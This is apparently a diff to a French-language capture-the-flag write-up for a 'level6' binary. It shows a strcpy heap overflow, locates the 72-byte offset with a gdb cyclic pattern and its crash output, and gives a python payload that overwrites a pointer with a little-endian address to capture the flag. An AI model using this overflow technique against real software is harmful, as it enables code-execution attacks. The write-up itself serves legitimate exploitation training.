@@ -8,9 +8,9 @@ Je remarque que:
 > la fonction main fait un strcpy de la chaine passée en argument du programme, la chaine de destination est précedement alloué avec un malloc de 0x40, soit 64 en décimal
 
 En lisant le manuel de strcpy, je vois que si la chaîne destination de strcpy n'est pas assez grande, il est possible de faire un overflow.
-Il faut maintenant déterminer l'offset, j'ai donc 64 (+4 venant d'une autre allocation) (+4 venant du strcpy) soit 72 avant d'overflow
-Je vais donc placer 72 caracteres, puis placer l'adresse de n en little-endian
-
-En lançant le payload
-./level6 $(cat /tmp/exploit)
-j'obtiens le flag du level suivant
+Il faut maintenant déterminer l'offset:
+> gdb --args level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+Program received signal SIGSEGV, Segmentation fault.
+0x53535353 in ?? ()
+> 53 correspond a la lettre S, je sais donc que le depassement de memoire est produit a partir de la lettre precedente : R
+./level6 $(python -c "print('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR' + b'\x54\x84\x04\x08')")
